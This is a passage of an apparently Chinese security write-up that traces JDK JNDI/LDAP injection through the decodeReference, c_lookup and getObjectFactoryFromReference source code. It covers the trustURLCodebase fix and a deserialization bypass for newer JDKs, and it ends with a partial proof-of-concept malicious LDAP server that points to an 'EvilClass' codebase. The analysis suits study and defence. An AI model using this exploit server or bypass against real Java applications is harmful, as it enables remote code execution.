</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#111>var4</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p><code>Obj</code>类的<code>decodeReference</code>方法根据<code>Ldap</code>传入的<code>addAttribute</code>属性构造并返回了一个新的<code>reference</code>对象引用</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>private</span> <span style=color:#00a8c8>static</span> <span style=color:#111>Reference</span> <span style=color:#75af00>decodeReference</span><span style=color:#f92672>(</span><span style=color:#111>Attributes</span> <span style=color:#111>var0</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>var1</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span><span style=color:#f92672>,</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>var4</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Attribute</span> <span style=color:#111>var2</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>]))</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvalidAttributesException</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>]</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34; attribute is required&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>String</span> <span style=color:#111>var3</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>var2</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>3</span><span style=color:#f92672>]))</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>var4</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>var2</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//返回一个新的Reference对象引用
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>Reference</span> <span style=color:#111>var5</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#111>var3</span><span style=color:#f92672>,</span> <span style=color:#111>var4</span><span style=color:#f92672>,</span> <span style=color:#111>var1</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>?</span> <span style=color:#111>var1</span><span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>:</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取第6个属性
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>5</span><span style=color:#f92672>]))</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>               <span style=color:#75715e>//省略部分代码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//直接返回reference对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>return</span> <span style=color:#111>var5</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p><code>LADP</code>服务的<code>Reference</code>对象引用的获取和<code>jndi</code>注入中的不太一样，<code>jndi</code>是通过<code>ReferenceWrapper_Stub</code>对象的<code>getReference</code>方法获取<code>reference</code>对象，而<code>LADP</code>服务是根据传入的属性构造一个新的<code>reference</code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为<code>null</code>则直接返回新的<code>reference</code>对象引用。</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>private</span> <span style=color:#00a8c8>static</span> <span style=color:#111>Reference</span> <span style=color:#75af00>decodeReference</span><span style=color:#f92672>(</span><span style=color:#111>Attributes</span> <span style=color:#111>var0</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>var1</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span><span style=color:#f92672>,</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>var4</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Attribute</span> <span style=color:#111>var2</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>]))</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvalidAttributesException</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>]</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34; attribute is required&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>String</span> <span style=color:#111>var3</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>var2</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>3</span><span style=color:#f92672>]))</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>var4</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>var2</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//返回一个新的Reference对象引用
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>Reference</span> <span style=color:#111>var5</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#111>var3</span><span style=color:#f92672>,</span> <span style=color:#111>var4</span><span style=color:#f92672>,</span> <span style=color:#111>var1</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>?</span> <span style=color:#111>var1</span><span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>:</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取第6个属性
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>5</span><span style=color:#f92672>]))</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>               <span style=color:#75715e>//省略部分代码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//直接返回reference对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>return</span> <span style=color:#111>var5</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p><code>LADP</code>服务的<code>Reference</code>对象引用的获取和<code>jndi</code>注入中的不太一样，<code>jndi</code>是通过<code>ReferenceWrapper_Stub</code>对象的<code>getReference</code>方法获取<code>reference</code>对象，而<code>LADP</code>服务是根据传入的属性构造一个新的<code>reference</code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为<code>null</code>则直接返回新的<code>reference</code>对象引用。</p><p><code>reference</code>对象的三个属性:<code>className</code>，<code>classFactory</code>，<code>classFactoryLocation</code>）如下所示：
<a href=https://storage.tttang.com/media/attachment/2022/05/25/54d90b72-d850-472c-a63d-d3bb838340a3.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/54d90b72-d850-472c-a63d-d3bb838340a3.png alt=ldap_low5.png></a>
接着会返回到<code>decodeObject</code>方法调用处，然后再返回到<code>LdapCtx</code>类的<code>c_lookup</code>方法调用处，接着往下执行调用<code>getObjectInstance</code>方法</p><pre tabindex=0><code>protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
    var2.setError(this, var1);
    Object var3 = null;

    Object var4;
    try {
        SearchControls var22 = new SearchControls();
        var22.setSearchScope(0);
        var22.setReturningAttributes((String[])null);
        var22.setReturningObjFlag(true);
        LdapResult var23 = this.doSearchOnce(var1, &#34;(objectClass=*)&#34;, var22, true);
        this.respCtls = var23.resControls;
        if (var23.status != 0) {
            this.processReturnCode(var23, var1);
        }

        if (var23.entries != null &amp;&amp; var23.entries.size() == 1) {
            LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
            var4 = var25.attributes;
            Vector var8 = var25.respCtls;
            if (var8 != null) {
                appendVector(this.respCtls, var8);
            }
        } else {
            var4 = new BasicAttributes(true);
        }

        if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
//var3接收reference对象
            var3 = Obj.decodeObject((Attributes)var4);
        }

        if (var3 == null) {
            var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
        }
    } catch (LdapReferralException var20) {
        LdapReferralException var5 = var20;
        if (this.handleReferrals == 2) {
            throw var2.fillInException(var20);
        }

        while(true) {
            LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);

            try {
                Object var7 = var6.lookup(var1);
                return var7;
            } catch (LdapReferralException var18) {
                var5 = var18;
            } finally {
                var6.close();
            }
        }
    } catch (NamingException var21) {
        throw var2.fillInException(var21);
    }

    try {
//调用了getObjectInstance方法
        return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
    } catch (NamingException var16) {
        throw var2.fillInException(var16);
    } catch (Exception var17) {
        NamingException var24 = new NamingException(&#34;problem generating object using object factory&#34;);
        var24.setRootCause(var17);
        throw var2.fillInException(var24);
    }
}
</code></pre><p><code>c_lookup</code>方法将<code>var3</code>（<code>reference</code>对象）传给了<code>getObjectInstance</code>方法的<code>refInfo</code>参数，继续跟进分析<code>getObjectInstance</code>方法</p><pre tabindex=0><code>    public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx , Hashtable&lt;?,?&gt; environment, Attributes attrs) throws Exception {
            ObjectFactory factory;
            //获取对象工厂
            ObjectFactoryBuilder builder = getObjectFactoryBuilder();
            if (builder != null) {
                // builder must return non-null factory
                factory = builder.createObjectFactory(refInfo, environment);
                if (factory instanceof DirObjectFactory) {
                    return ((DirObjectFactory)factory).getObjectInstance(
                        refInfo, name, nameCtx, environment, attrs);
                } else {
                    return factory.getObjectInstance(refInfo, name, nameCtx,
                        environment);
                }
            }

            // use reference if possible
            Reference ref = null;
            //判断reference对象是否为Reference
            if (refInfo instanceof Reference) {
                 //转换为Reference类型
                ref = (Reference) refInfo;
            } else if (refInfo instanceof Referenceable) {
                ref = ((Referenceable)(refInfo)).getReference();
            }

            Object answer;
            //reference对象是否为空
            if (ref != null) {
                //获取工厂类名Exp
                String f = ref.getFactoryClassName();
                if (f != null) {
                    // if reference identifies a factory, use exclusively
                    //根据工厂类远程获取对象引用
                    factory = getObjectFactoryFromReference(ref, f);
                    if (factory instanceof DirObjectFactory) {
                        return ((DirObjectFactory)factory).getObjectInstance(
                            ref, name, nameCtx, environment, attrs);
                    } else if (factory != null) {
                        return factory.getObjectInstance(ref, name, nameCtx,
                                                         environment);
                    }
                    // No factory found, so return original refInfo.
                    // Will reach this point if factory class is not in
                    // class path and reference does not contain a URL for it
                    return refInfo;

                } else {
                    // if reference has no factory, check for addresses
                    // containing URLs
                    // ignore name &amp; attrs params; not used in URL factory

                    answer = processURLAddrs(ref, name, nameCtx, environment);
                    if (answer != null) {
                        return answer;
                    }
                }
            }

            // try using any specified factories
            answer = createObjectFromFactories(refInfo, name, nameCtx,
                                               environment, attrs);
            return (answer != null) ? answer : refInfo;

    }
</code></pre><p><code>getObjectInstance</code>方法将<code>reference</code>对象转换为<code>Reference</code>类型并判断<code>reference</code>对象是否为空，如果不为空则从<code>reference</code>引用中获取工厂类<code>Exp</code>名字，接着调用<code>getObjectFactoryFromReference</code>方法根据工厂类Exp名字获取远程调用对象。</p><p><code>getObjectFactoryFromReference</code>方法实现如下：</p><pre tabindex=0><code>    static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException,InstantiationException, MalformedURLException {
        Class&lt;?&gt; clas = null;

        // Try to use current class loader
        try {
             //尝试先在本地加载Exp类
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        //获取远程地址
        if (clas == null &amp;&amp; (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                //loadClass方法远程加载Exp类
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {

            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
</code></pre><p><img src=https://storage.tttang.com/media/attachment/2022/05/25/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png alt=ldap_low6.png>
可以看到<code>LDAP</code>服务跟<code>jndi</code>一样，会尝试先在本地查找加载<code>Exp</code>类，如果本地没有找到<code>Exp</code>类，那么<code>getFactoryClassLocation</code>方法会获取远程加载的<code>url</code>地址，如果不为空则根据远程<code>url</code>地址使用类加载器<code>URLClassLoader</code>来加载<code>Exp</code>类，通过分析发现<code>LDAP</code>服务的整个利用流程都没有<code>URLCodebase</code>限制。
看一下整个调用站栈
<img src=https://storage.tttang.com/media/attachment/2022/05/25/b956cc02-77f5-47b0-91fb-b50bd619731e.png alt=ldap_low7.png></p><h3 id=高版本-1>高版本</h3><p>在<code>jdk8u191</code>以上的版本中修复了<code>LDAP</code>服务远程加载恶意类这个漏洞，<code>LDAP</code>服务在进行远程加载之前也添加了系统属性<code>trustURLCodebase</code>的限制，通过分析在<code>jdk8u191</code>版本发现，在<code>loadClass</code>方法内部添加了系统属性<code>trustURLCodebase</code>的判断，如果<code>trustURLCodebase</code>为<code>false</code>就直接返回<code>null</code>，只有当<code>trustURLCodebase</code>值为<code>true</code>时才允许远程加载。
<a href=https://storage.tttang.com/media/attachment/2022/05/25/0a671754-9117-443b-8858-3919227da73d.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/0a671754-9117-443b-8858-3919227da73d.png alt=ldap_low8.png></a></p><p>在高版本 <code>JDK</code> 中需要通过 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 选项去启用。这个限制在 <code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 版本时加入，略晚于 <code>RMI</code> 的远程加载限制。</p><h4 id=序列化绕过>序列化绕过</h4><p><code>com.sun.jndi.ldap.Obj.java#decodeObject</code>存在对<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>的判断
<a href=http://tttang.com/archive/1611/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90>这里</a>提到 <code>com.sun.jndi.ldap.Obj.java#decodeObject</code> 主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。之前讲到<code>Reference</code>对象，现在讲一下传来的是序列化的对象这种情况。
如果是序列化对象会调用<code>deserializeObject</code>方法
<a href=https://storage.tttang.com/media/attachment/2022/05/25/0f23b7e2-d585-4310-a4cd-f3705039f291.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/0f23b7e2-d585-4310-a4cd-f3705039f291.png alt=serialize1.png></a>
进入<code>deserializeObject</code>方法，发现会进行<code>readObject</code>
<a href=https://storage.tttang.com/media/attachment/2022/05/25/131b7fe6-fedf-45f1-b860-db06560a5dfe.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/131b7fe6-fedf-45f1-b860-db06560a5dfe.png alt=serialize2.png></a>
看一下调用栈
<a href=https://storage.tttang.com/media/attachment/2022/05/25/6f3b9090-de13-46b7-9447-5058855844cc.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/6f3b9090-de13-46b7-9447-5058855844cc.png alt=serialize3.png></a></p><h5 id=poc-1>poc</h5><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.alter.JNDI_LDAP.util.serializeObject</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.listener.InMemoryListenerConfig</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.sdk.Entry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.sdk.LDAPException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.sdk.LDAPResult</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.unboundid.ldap.sdk.ResultCode</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.net.ServerSocketFactory</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.net.SocketFactory</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.net.ssl.SSLSocketFactory</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.net.InetAddress</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.net.MalformedURLException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.net.URL</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import static</span> <span style=color:#111>com.alter.JNDI_LDAP.util.serializeObject.getPayload</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import static</span> <span style=color:#111>com.alter.JNDI_LDAP.util.serializeObject.serializeObject</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>Ldap</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>LDAP_BASE</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;dc=example,dc=com&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>argsx</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;http://127.0.0.1:8000/#EvilClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;1389&#34;</span><span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>int</span> <span style=color:#111>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>args</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>||</span> <span style=color:#111>args</span><span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>].</span><span style=color:#75af00>indexOf</span><span style=color:#f92672>(</span><span style=color:#d88200>&#39;#&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>err</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>Ldap</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getSimpleName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34; &lt;codebase_url#classname&gt; [&lt;port&gt;]&#34;</span><span style=color:#f92672>);</span> <span style=color:#75715e>//$NON-NLS-1$
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>exit</span><span style=color:#f92672>(-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>args</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>port</span> <span style=color:#f92672>=</span> <span style=color:#111>Integer</span><span style=color:#f92672>.</span><span style=color:#75af00>parseInt</span><span style=color:#f92672>(</span><span style=color:#111>args</span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span><span style=color:#f92672>]);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>InMemoryDirectoryServerConfig</span> <span style=color:#111>config</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InMemoryDirectoryServerConfig</span><span style=color:#f92672>(</span><span style=color:#111>LDAP_BASE</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>config</span><span style=color:#f92672>.</span><span style=color:#75af00>setListenerConfigs</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>InMemoryListenerConfig</span><span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                    <span style=color:#d88200>&#34;listen&#34;</span><span style=color:#f92672>,</span> <span style=color:#75715e>//$NON-NLS-1$
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#111>InetAddress</span><span style=color:#f92672>.</span><span style=color:#75af00>getByName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;0.0.0.0&#34;</span><span style=color:#f92672>),</span> <span style=color:#75715e>//$NON-NLS-1$
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#111>port</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>ServerSocketFactory</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>(),</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>SocketFactory</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>(),</span>
</span></span><span style=display:flex><span>                    <span style=color:#f92672>(</span><span style=color:#111>SSLSocketFactory</span><span style=color:#f92672>)</span> <span style=color:#111>SSLSocketFactory</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>config</span><span style=color:#f92672>.</span><span style=color:#75af00>addInMemoryOperationInterceptor</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>OperationInterceptor</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>URL</span><span style=color:#f92672>(</span><span style=color:#111>args</span><span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>])));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>InMemoryDirectoryServer</span> <span style=color:#111>ds</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InMemoryDirectoryServer</span><span style=color:#f92672>(</span><span style=color:#111>config</span><span style=color:#f92672>);</span>
